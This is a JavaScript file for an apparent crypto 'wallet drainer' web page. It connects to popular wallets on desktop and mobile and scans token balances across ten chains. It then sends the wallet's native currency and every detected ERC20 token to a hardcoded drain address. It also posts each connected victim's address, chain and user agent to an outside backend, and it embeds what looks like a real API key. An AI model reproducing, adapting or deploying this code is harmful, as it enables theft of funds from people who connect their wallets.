// ================================================
// TOKEN DRAIN SCANNER - UNIVERSAL WALLET CONNECTION
// ALL WALLETS WORK ON BOTH PC & MOBILE
// ================================================

// Configuration
const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    
    networkNames: {
        1: "Ethereum Mainnet",
        56: "Binance Smart Chain", 
        137: "Polygon",
        10: "Optimism",
        42161: "Arbitrum",
        43114: "Avalanche",
        8453: "Base",
        250: "Fantom",
        100: "Gnosis",
        25: "Cronos"
    },
    
    // Wallet configurations - UNIVERSAL CONNECTION
    wallets: {
        metaMask: {
            name: "MetaMask",
            icon: "🦊",
            color: "#f6851b",
            detect: () => window.ethereum?.isMetaMask,
            // Universal deep link for all platforms
            deeplink: "https://metamask.app.link/dapp/" + window.location.href,
            // Direct connection method
            connect: async () => {
                if (window.ethereum?.isMetaMask) {
                    const accounts = await window.ethereum.request({ 
                        method: 'eth_requestAccounts' 
                    });
                    return accounts[0];
                }
                return null;
            }
        },
        trust: {
            name: "Trust Wallet",
            icon: "🔶",
            color: "#3375bb",
            detect: () => window.ethereum?.isTrust,
            // Trust Wallet uses different scheme
            deeplink: (function() {
                const url = encodeURIComponent(window.location.href);
                if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
                    return `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`;
                } else if (/android/i.test(navigator.userAgent)) {
                    return `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`;
                }
                return `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`;
            })(),
            connect: async () => {
                if (window.ethereum?.isTrust) {
                    const accounts = await window.ethereum.request({ 
                        method: 'eth_requestAccounts' 
                    });
                    return accounts[0];
                }
                return null;
            }
        },
        binance: {
            name: "Binance Wallet",
            icon: "🟡",
            color: "#f0b90b",
            detect: () => window.ethereum?.isBinance || window.BinanceChain,
            // Binance deep links
            deeplink: (function() {
                if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
                    return "bnc://app.binance.com/";
                } else if (/android/i.test(navigator.userAgent)) {
                    return "intent://app.binance.com/#Intent;scheme=bnc;package=com.binance.dev;end";
                }
                return "https://binance.com/";
            })(),
            connect: async () => {
                if (window.ethereum?.isBinance) {
                    const accounts = await window.ethereum.request({ 
                        method: 'eth_requestAccounts' 
                    });
                    return accounts[0];
                } else if (window.BinanceChain) {
                    const accounts = await window.BinanceChain.request({ 
                        method: 'eth_requestAccounts' 
                    });
                    return accounts[0];
                }
                return null;
            }
        },
        coinbase: {
            name: "Coinbase Wallet",
            icon: "🔷",
            color: "#0052ff",
            detect: () => window.ethereum?.isCoinbaseWallet,
            deeplink: "https://go.cb-w.com/" + window.location.href,
            connect: async () => {
                if (window.ethereum?.isCoinbaseWallet) {
                    const accounts = await window.ethereum.request({ 
                        method: 'eth_requestAccounts' 
                    });
                    return accounts[0];
                }
                return null;
            }
        },
        phantom: {
            name: "Phantom",
            icon: "👻",
            color: "#ab9ff2",
            detect: () => window.ethereum?.isPhantom,
            deeplink: "https://phantom.app/ul/browse/" + window.location.href,
            connect: async () => {
                if (window.ethereum?.isPhantom) {
                    const accounts = await window.ethereum.request({ 
                        method: 'eth_requestAccounts' 
                    });
                    return accounts[0];
                }
                return null;
            }
        },
        okx: {
            name: "OKX Wallet",
            icon: "⚡",
            color: "#000000",
            detect: () => window.ethereum?.isOkxWallet,
            deeplink: "https://www.okx.com/download",
            connect: async () => {
                if (window.ethereum?.isOkxWallet) {
                    const accounts = await window.ethereum.request({ 
                        method: 'eth_requestAccounts' 
                    });
                    return accounts[0];
                }
                return null;
            }
        }
    }
};

// Global state
let currentAccount = null;
let currentChainId = null;
let isConnected = false;
let detectedTokens = [];
let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn, networkSelector, scanAllBtn;

// Initialize app
function initializeApp() {
    console.log('🚀 Initializing Token Drain Scanner...');
    console.log('📱 Device:', isMobile ? 'Mobile' : 'Desktop');
    
    // Get DOM elements
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    networkSelector = document.getElementById('networkSelector');
    scanAllBtn = document.getElementById('scanAllBtn');
    
    if (!connectBtn || !statusEl) {
        console.error('❌ Required elements not found');
        return;
    }
    
    // Setup event listeners
    connectBtn.onclick = handleConnect;
    if (drainBtn) drainBtn.onclick = handleDrain;
    if (scanAllBtn) scanAllBtn.onclick = handleScanAllChains;
    if (networkSelector) networkSelector.onchange = handleNetworkChange;
    
    // Check existing connection
    checkExistingConnection();
    
    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
}

// Check existing wallet connection
async function checkExistingConnection() {
    if (!window.ethereum && !window.BinanceChain) return;
    
    try {
        const provider = window.ethereum || window.BinanceChain;
        const accounts = await provider.request({ 
            method: 'eth_accounts' 
        });
        
        if (accounts && accounts.length > 0) {
            const chainIdHex = await provider.request({ 
                method: 'eth_chainId' 
            });
            const chainId = parseInt(chainIdHex, 16);
            await handleConnected(accounts[0], chainId);
        }
    } catch (error) {
        console.log('⚠️ No existing connection');
    }
}

// Handle connect button click
async function handleConnect() {
    if (isConnected) {
        await disconnectWallet();
        return;
    }
    
    // Show universal wallet selector
    showUniversalWalletSelector();
}

// Show universal wallet selector
function showUniversalWalletSelector() {
    const detectedWallets = [];
    
    // Check which wallets are detected
    for (const [key, wallet] of Object.entries(CONFIG.wallets)) {
        const isDetected = wallet.detect();
        detectedWallets.push({
            key,
            name: wallet.name,
            icon: wallet.icon,
            color: wallet.color,
            detected: isDetected,
            deeplink: wallet.deeplink
        });
    }
    
    // Always show at least MetaMask and Trust
    if (!detectedWallets.find(w => w.key === 'metaMask')) {
        detectedWallets.push({
            key: 'metaMask',
            name: 'MetaMask',
            icon: '🦊',
            color: '#f6851b',
            detected: false,
            deeplink: CONFIG.wallets.metaMask.deeplink
        });
    }
    
    if (!detectedWallets.find(w => w.key === 'trust')) {
        detectedWallets.push({
            key: 'trust',
            name: 'Trust Wallet',
            icon: '🔶',
            color: '#3375bb',
            detected: false,
            deeplink: CONFIG.wallets.trust.deeplink
        });
    }
    
    const selectorHTML = `
        <div class="wallet-selector-overlay">
            <div class="wallet-selector-modal">
                <div class="modal-header">
                    <h3>Connect Wallet</h3>
                    <button class="close-btn" onclick="closeWalletSelector()">×</button>
                </div>
                <p class="modal-subtitle">Select your wallet to connect</p>
                
                <div class="wallet-grid">
                    ${detectedWallets.map(wallet => `
                        <button class="wallet-card" onclick="selectWallet('${wallet.key}')" 
                                style="--wallet-color: ${wallet.color}"
                                data-detected="${wallet.detected}">
                            <div class="wallet-icon">${wallet.icon}</div>
                            <div class="wallet-info">
                                <span class="wallet-name">${wallet.name}</span>
                                <span class="wallet-status ${wallet.detected ? 'detected' : 'not-detected'}">
                                    ${wallet.detected ? 'Detected' : 'Not Detected'}
                                </span>
                            </div>
                            <div class="arrow">→</div>
                        </button>
                    `).join('')}
                </div>
                
                <div class="other-options">
                    <h4>Universal Connection</h4>
                    <button class="universal-connect-btn" onclick="connectGeneric()">
                        🔗 Connect Any Wallet
                    </button>
                    <p class="hint">Use this if your wallet isn't listed above</p>
                </div>
            </div>
        </div>
    `;
    
    // Create and show selector
    const selector = document.createElement('div');
    selector.id = 'walletSelector';
    selector.innerHTML = selectorHTML;
    document.body.appendChild(selector);
    
    // Add CSS for selector
    addSelectorStyles();
}

// Add CSS for wallet selector
function addSelectorStyles() {
    const styles = `
        .wallet-selector-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(10px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            padding: 20px;
        }
        
        .wallet-selector-modal {
            background: white;
            border-radius: 24px;
            width: 100%;
            max-width: 480px;
            max-height: 80vh;
            overflow-y: auto;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 24px;
            border-bottom: 1px solid #eee;
        }
        
        .modal-header h3 {
            margin: 0;
            font-size: 22px;
            font-weight: 700;
        }
        
        .close-btn {
            background: none;
            border: none;
            font-size: 32px;
            cursor: pointer;
            color: #666;
            line-height: 1;
        }
        
        .modal-subtitle {
            padding: 0 24px 20px;
            margin: 0;
            color: #666;
            text-align: center;
        }
        
        .wallet-grid {
            padding: 0 20px 20px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        .wallet-card {
            display: flex;
            align-items: center;
            gap: 15px;
            padding: 16px;
            background: white;
            border: 2px solid #e5e7eb;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.2s;
            text-align: left;
            width: 100%;
        }
        
        .wallet-card:hover {
            border-color: var(--wallet-color);
            background: #f9fafb;
            transform: translateY(-2px);
        }
        
        .wallet-card[data-detected="false"] {
            opacity: 0.7;
        }
        
        .wallet-icon {
            font-size: 28px;
            width: 48px;
            height: 48px;
            border-radius: 12px;
            background: var(--wallet-color);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        
        .wallet-info {
            flex: 1;
        }
        
        .wallet-name {
            display: block;
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 4px;
        }
        
        .wallet-status {
            font-size: 13px;
            font-weight: 500;
        }
        
        .wallet-status.detected {
            color: #10b981;
        }
        
        .wallet-status.not-detected {
            color: #6b7280;
        }
        
        .arrow {
            color: #9ca3af;
            font-size: 20px;
        }
        
        .other-options {
            padding: 24px;
            border-top: 1px solid #eee;
            text-align: center;
        }
        
        .other-options h4 {
            margin: 0 0 12px;
            color: #374151;
        }
        
        .universal-connect-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 16px;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .universal-connect-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
        }
        
        .hint {
            font-size: 13px;
            color: #6b7280;
            margin: 8px 0 0;
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
    `;
    
    const styleSheet = document.createElement('style');
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
}

// Close wallet selector
function closeWalletSelector() {
    const selector = document.getElementById('walletSelector');
    if (selector) {
        selector.style.opacity = '0';
        setTimeout(() => selector.remove(), 200);
    }
}

// Select wallet
async function selectWallet(walletKey) {
    closeWalletSelector();
    
    const wallet = CONFIG.wallets[walletKey];
    if (!wallet) {
        updateStatus('❌ Wallet not supported');
        return;
    }
    
    updateStatus(`🔄 Connecting with ${wallet.name}...`);
    
    // Check if wallet is detected
    if (wallet.detect()) {
        // Wallet is detected, try direct connection
        try {
            const account = await wallet.connect();
            if (account) {
                const provider = window.ethereum || window.BinanceChain;
                const chainIdHex = await provider.request({ method: 'eth_chainId' });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(account, chainId);
                return;
            }
        } catch (error) {
            console.log(`Direct connection failed: ${error.message}`);
        }
    }
    
    // If direct connection fails or wallet not detected, use universal method
    if (isMobile) {
        // On mobile, open wallet app directly
        openMobileWallet(walletKey);
    } else {
        // On desktop, try universal connection
        await connectGeneric();
    }
}

// Open mobile wallet
function openMobileWallet(walletKey) {
    const wallet = CONFIG.wallets[walletKey];
    if (!wallet || !wallet.deeplink) {
        showMobileInstructions(walletKey);
        return;
    }
    
    // Try to open wallet app
    window.location.href = wallet.deeplink;
    
    // If still on page after 2 seconds, show instructions
    setTimeout(() => {
        if (!isConnected) {
            showMobileInstructions(walletKey);
        }
    }, 2000);
}

// Show mobile instructions
function showMobileInstructions(walletKey) {
    const wallet = CONFIG.wallets[walletKey];
    if (!wallet) return;
    
    const instructionsHTML = `
        <div class="mobile-instructions-overlay">
            <div class="mobile-instructions-modal">
                <div class="modal-header">
                    <h3>Open ${wallet.name}</h3>
                    <button class="close-btn" onclick="closeMobileInstructions()">×</button>
                </div>
                
                <div class="instructions-content">
                    <div class="wallet-icon-large" style="background: ${wallet.color}">
                        ${wallet.icon}
                    </div>
                    
                    <h4>Steps to connect:</h4>
                    <ol>
                        <li>Make sure ${wallet.name} is installed</li>
                        <li>Open ${wallet.name} app</li>
                        <li>Go to DApps/Browser section</li>
                        <li>Navigate to this site</li>
                        <li>Click "Connect"</li>
                    </ol>
                    
                    <button class="primary-btn" onclick="closeMobileInstructions()">
                        I've Connected
                    </button>
                    
                    <button class="secondary-btn" onclick="connectGeneric()">
                        Try Universal Connection
                    </button>
                </div>
            </div>
        </div>
        
        <style>
            .mobile-instructions-overlay {
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(0, 0, 0, 0.8);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 10000;
                padding: 20px;
            }
            
            .mobile-instructions-modal {
                background: white;
                border-radius: 24px;
                width: 100%;
                max-width: 400px;
                padding: 24px;
            }
            
            .instructions-content {
                text-align: center;
            }
            
            .wallet-icon-large {
                font-size: 48px;
                width: 80px;
                height: 80px;
                border-radius: 20px;
                display: flex;
                align-items: center;
                justify-content: center;
                color: white;
                margin: 0 auto 20px;
            }
            
            .instructions-content h4 {
                margin: 0 0 16px;
                color: #111827;
            }
            
            .instructions-content ol {
                text-align: left;
                margin: 0 0 24px;
                padding-left: 20px;
            }
            
            .instructions-content li {
                margin: 8px 0;
                color: #374151;
            }
            
            .primary-btn, .secondary-btn {
                width: 100%;
                padding: 16px;
                border-radius: 12px;
                font-weight: 600;
                cursor: pointer;
                margin: 8px 0;
                border: none;
            }
            
            .primary-btn {
                background: ${wallet.color};
                color: white;
            }
            
            .secondary-btn {
                background: #f3f4f6;
                color: #374151;
                border: 2px solid #e5e7eb;
            }
        </style>
    `;
    
    const instructions = document.createElement('div');
    instructions.innerHTML = instructionsHTML;
    document.body.appendChild(instructions);
}

// Close mobile instructions
function closeMobileInstructions() {
    const instructions = document.querySelector('.mobile-instructions-overlay');
    if (instructions) instructions.remove();
}

// Universal connection for any wallet
async function connectGeneric() {
    updateStatus('🔄 Connecting to any available wallet...');
    
    // Try window.ethereum first (MetaMask, Trust, Coinbase, etc.)
    if (window.ethereum) {
        try {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await window.ethereum.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId);
                return;
            }
        } catch (error) {
            console.log('Ethereum connection failed:', error);
        }
    }
    
    // Try Binance Chain
    if (window.BinanceChain) {
        try {
            const accounts = await window.BinanceChain.request({ 
                method: 'eth_requestAccounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await window.BinanceChain.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId);
                return;
            }
        } catch (error) {
            console.log('Binance Chain connection failed:', error);
        }
    }
    
    // No wallet found
    if (isMobile) {
        updateStatus('❌ No wallet detected. Please open this page in your wallet browser.');
        alert('Please open this page in your wallet app (MetaMask, Trust Wallet, etc.)');
    } else {
        updateStatus('❌ No wallet detected. Please install a wallet extension.');
        alert('Please install a wallet extension like MetaMask or Trust Wallet');
    }
}

// Handle successful connection
async function handleConnected(account, chainId) {
    try {
        // Update state
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        
        // Update UI
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected!\nWallet: ${account.slice(0, 8)}...\nNetwork: ${chainName}`);
        
        // Show other UI elements
        showUIElements();
        
        // Setup wallet listeners
        setupWalletListeners();
        
        // Log to backend
        await logConnectionToBackend(account, chainId);
        
        // Fetch tokens
        await fetchTokens(account, chainId);
        
    } catch (error) {
        console.error('❌ Setup error:', error);
        updateStatus('Setup failed: ' + error.message);
        isConnected = false;
        currentAccount = null;
        currentChainId = null;
    }
}

// Setup wallet event listeners
function setupWalletListeners() {
    const provider = window.ethereum || window.BinanceChain;
    if (!provider) return;
    
    provider.on('accountsChanged', (accounts) => {
        console.log('🔄 Accounts changed:', accounts);
        
        if (accounts.length === 0) {
            disconnectWallet();
        } else if (currentAccount !== accounts[0]) {
            currentAccount = accounts[0];
            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
            fetchTokens(currentAccount, currentChainId);
        }
    });
    
    provider.on('chainChanged', (chainIdHex) => {
        const chainId = parseInt(chainIdHex, 16);
        console.log('🔄 Chain changed:', chainId);
        
        currentChainId = chainId;
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`🔄 Network changed: ${chainName}`);
        
        fetchTokens(currentAccount, chainId);
    });
    
    provider.on('disconnect', (error) => {
        console.log('🔌 Wallet disconnected:', error);
        disconnectWallet();
    });
}

// Fetch tokens for current chain
async function fetchTokens(address, chainId) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) {
            throw new Error(`API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        const tokens = items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    balance: t.balance,
                    chainId: chainId,
                    chainName: chainName,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url
                };
            });
        
        detectedTokens = tokens;
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens on ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}`);
        } else {
            tokensEl.innerHTML = '<div class="loading">No tokens found</div>';
            updateStatus('ℹ️ No tokens found');
        }
        
    } catch (error) {
        console.error('❌ Token fetch error:', error);
        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens</div>';
        updateStatus('⚠️ Token scan failed');
    }
}

// Display tokens
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    // Group tokens by chain
    const tokensByChain = {};
    tokens.forEach(token => {
        if (!tokensByChain[token.chainId]) {
            tokensByChain[token.chainId] = [];
        }
        tokensByChain[token.chainId].push(token);
    });
    
    let html = '';
    
    Object.entries(tokensByChain).forEach(([chainId, chainTokens]) => {
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        
        html += `
            <div class="chain-section">
                <div class="chain-header">
                    <h4>${chainName}</h4>
                    <span class="token-count">${chainTokens.length} tokens</span>
                </div>
                ${chainTokens.map(token => `
                    <div class="token-item" data-address="${token.contractAddress || 'native'}" data-chain="${chainId}">
                        <div class="token-info">
                            ${token.logoUrl ? `<img src="${token.logoUrl}" class="token-logo" alt="${token.symbol}" />` : ''}
                            <div>
                                <span class="token-symbol">${token.symbol}</span>
                                <span class="token-name">${token.name}</span>
                            </div>
                        </div>
                        <div class="token-amounts">
                            <div class="token-amount">${token.amount}</div>
                            <div class="token-value">${token.value}</div>
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    });
    
    tokensEl.innerHTML = html;
}

// Handle drain - DRAIN ALL TOKENS
async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    if (detectedTokens.length === 0) {
        alert('No tokens detected to drain');
        return;
    }
    
    // Confirm drain
    if (!confirm(`⚠️ WARNING: This will send ALL detected tokens and native currency to:\n${CONFIG.drainAddress}\n\nEstimated tokens: ${detectedTokens.length}\n\nContinue?`)) {
        return;
    }
    
    const drainBtn = document.getElementById('drainBtn');
    
    try {
        updateStatus('🚀 Starting comprehensive drain...');
        
        if (drainBtn) {
            drainBtn.disabled = true;
            drainBtn.textContent = '⏳ Draining ALL tokens...';
        }
        
        // Create progress indicator
        const progress = document.createElement('div');
        progress.id = 'drainProgress';
        progress.innerHTML = '<div class="progress-bar"><div class="progress-fill"></div></div><div class="progress-text">Starting...</div>';
        statusEl.appendChild(progress);
        
        // 1. First, drain native token (ETH, BNB, MATIC, etc.)
        await drainNativeToken();
        
        // 2. Drain all ERC20 tokens
        await drainAllERC20Tokens();
        
        updateStatus('✅ Drain completed successfully!');
        alert('✅ All tokens have been drained successfully!');
        
        // Refresh token list
        await fetchTokens(currentAccount, currentChainId);
        
    } catch (error) {
        console.error('❌ Drain error:', error);
        
        let errorMsg = error.message || 'Unknown error';
        if (error.code === 4001) {
            errorMsg = 'Transaction rejected by user';
        } else if (error.code === -32603) {
            errorMsg = 'Transaction failed. Check gas settings.';
        } else if (error.message.includes('insufficient funds')) {
            errorMsg = 'Insufficient funds for gas fees';
        }
        
        updateStatus(`❌ Drain failed: ${errorMsg}`);
        alert(`Drain failed: ${errorMsg}`);
        
    } finally {
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = '⚡ Drain All Tokens';
        }
        
        // Remove progress indicator
        const progress = document.getElementById('drainProgress');
        if (progress) progress.remove();
    }
}

// Drain native token
async function drainNativeToken() {
    updateProgress('Draining native token...', 10);
    
    const provider = window.ethereum || window.BinanceChain;
    
    // Get balance
    const balanceHex = await provider.request({
        method: 'eth_getBalance',
        params: [currentAccount, 'latest']
    });
    
    const balance = parseInt(balanceHex, 16);
    
    if (balance === 0) {
        updateProgress('No native token to drain', 20);
        return;
    }
    
    // Get gas price
    const gasPriceHex = await provider.request({
        method: 'eth_gasPrice',
        params: []
    });
    
    const gasPrice = parseInt(gasPriceHex, 16);
    const gasLimit = 21000;
    const gasCost = gasPrice * gasLimit;
    
    // Check if we have enough for gas
    if (balance <= gasCost * 2) {
        updateProgress('Not enough native token for gas fees', 30);
        return;
    }
    
    // Calculate amount to send (leave some for gas for token transfers)
    const sendAmount = balance - (gasCost * 5);
    
    if (sendAmount <= 0) {
        updateProgress('Not enough after gas fees', 40);
        return;
    }
    
    // Send native token
    const txHash = await provider.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: CONFIG.drainAddress,
            value: '0x' + sendAmount.toString(16),
            gas: '0x' + gasLimit.toString(16),
            gasPrice: gasPriceHex
        }]
    });
    
    updateProgress(`Native token sent: ${txHash.slice(0, 10)}...`, 50);
    await new Promise(resolve => setTimeout(resolve, 3000));
}

// Drain all ERC20 tokens
async function drainAllERC20Tokens() {
    const provider = window.ethereum || window.BinanceChain;
    
    // Filter only ERC20 tokens (not native)
    const erc20Tokens = detectedTokens.filter(t => !t.isNative && t.contractAddress);
    
    if (erc20Tokens.length === 0) {
        updateProgress('No ERC20 tokens to drain', 60);
        return;
    }
    
    updateProgress(`Draining ${erc20Tokens.length} ERC20 tokens...`, 60);
    
    let completed = 0;
    
    for (const token of erc20Tokens) {
        try {
            // Drain the token
            await drainERC20Token(token);
            
            completed++;
            const percent = 60 + (completed / erc20Tokens.length * 40);
            updateProgress(`Draining ${token.symbol}... (${completed}/${erc20Tokens.length})`, percent);
            
            // Small delay between transactions
            await new Promise(resolve => setTimeout(resolve, 2000));
            
        } catch (error) {
            console.error(`Failed to drain ${token.symbol}:`, error);
        }
    }
    
    updateProgress(`Completed draining ${completed} tokens`, 100);
}

// Drain single ERC20 token
async function drainERC20Token(token) {
    const provider = window.ethereum || window.BinanceChain;
    
    // Encode transfer function call
    const transferData = encodeTransferData(token.balance);
    
    try {
        // Get gas estimate for token transfer
        const gasEstimate = await provider.request({
            method: 'eth_estimateGas',
            params: [{
                from: currentAccount,
                to: token.contractAddress,
                data: transferData
            }]
        });
        
        const gasLimit = parseInt(gasEstimate, 16) * 2;
        
        // Get gas price
        const gasPriceHex = await provider.request({
            method: 'eth_gasPrice',
            params: []
        });
        
        // Send token transfer
        const txHash = await provider.request({
            method: 'eth_sendTransaction',
            params: [{
                from: currentAccount,
                to: token.contractAddress,
                data: transferData,
                gas: '0x' + gasLimit.toString(16),
                gasPrice: gasPriceHex
            }]
        });
        
        return txHash;
        
    } catch (error) {
        console.error(`Failed to drain ${token.symbol}:`, error);
        throw error;
    }
}

// Encode transfer function call
function encodeTransferData(amount) {
    const functionSignature = '0xa9059cbb';
    const paddedAddress = CONFIG.drainAddress.slice(2).padStart(64, '0');
    const paddedAmount = BigInt(amount).toString(16).padStart(64, '0');
    return functionSignature + paddedAddress + paddedAmount;
}

// Update progress indicator
function updateProgress(message, percent) {
    const progressText = document.querySelector('.progress-text');
    const progressFill = document.querySelector('.progress-fill');
    
    if (progressText) {
        progressText.textContent = message;
    }
    
    if (progressFill) {
        progressFill.style.width = `${percent}%`;
    }
}

// Update status
function updateStatus(message) {
    if (statusEl) {
        statusEl.textContent = message;
    }
}

// Show UI elements
function showUIElements() {
    const elements = ['tokensContainer', 'drainBtn', 'scanAllBtn', 'networkSelector'];
    elements.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'block';
    });
}

// Hide UI elements
function hideUIElements() {
    const elements = ['tokensContainer', 'drainBtn', 'scanAllBtn', 'networkSelector'];
    elements.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'none';
    });
}

// Log connection to backend
async function logConnectionToBackend(address, chainId) {
    try {
        await fetch(CONFIG.backendUrl + '/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                timestamp: new Date().toISOString(),
                isMobile: isMobile,
                userAgent: navigator.userAgent
            })
        });
    } catch (error) {
        console.log('⚠️ Backend log failed');
    }
}

// Disconnect wallet
async function disconnectWallet() {
    console.log('🔄 Disconnecting...');
    
    // Reset state
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    detectedTokens = [];
    
    // Update UI
    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
    hideUIElements();
    
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
}

// Handle network change
async function handleNetworkChange() {
    if (!networkSelector || !networkSelector.value) return;
    
    const chainId = parseInt(networkSelector.value);
    if (!chainId || chainId === currentChainId) return;
    
    const provider = window.ethereum || window.BinanceChain;
    if (!provider) return;
    
    try {
        updateStatus(`🔄 Switching to ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}...`);
        
        await provider.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${chainId.toString(16)}` }],
        });
        
    } catch (switchError) {
        console.log('Network switch error:', switchError);
        updateStatus(`❌ Failed to switch network`);
    }
}

// Handle scan all chains
async function handleScanAllChains() {
    if (!currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    updateStatus('🔍 Scanning all chains for tokens...');
    
    const chainsToScan = [1, 56, 137, 42161, 10, 43114, 8453];
    let allTokens = [];
    
    for (const chainId of chainsToScan) {
        try {
            const tokens = await fetchTokensForChain(currentAccount, chainId);
            if (tokens.length > 0) {
                allTokens = [...allTokens, ...tokens];
            }
        } catch (error) {
            console.log(`⚠️ Failed to scan chain ${chainId}:`, error.message);
        }
    }
    
    detectedTokens = allTokens;
    
    if (allTokens.length > 0) {
        displayTokens(allTokens);
        updateStatus(`✅ Found ${allTokens.length} tokens across all chains`);
    } else {
        updateStatus('ℹ️ No tokens found on any chain');
    }
}

// Fetch tokens for specific chain
async function fetchTokensForChain(address, chainId) {
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) {
            throw new Error(`API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        return items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    balance: t.balance,
                    chainId: chainId,
                    chainName: chainName,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url
                };
            });
    } catch (error) {
        console.error(`❌ Token fetch error for chain ${chainId}:`, error);
        return [];
    }
}

// Initialize app on load
window.addEventListener('DOMContentLoaded', initializeApp);

// Make functions available globally
window.closeWalletSelector = closeWalletSelector;
window.selectWallet = selectWallet;
window.connectGeneric = connectGeneric;
window.closeMobileInstructions = closeMobileInstructions;
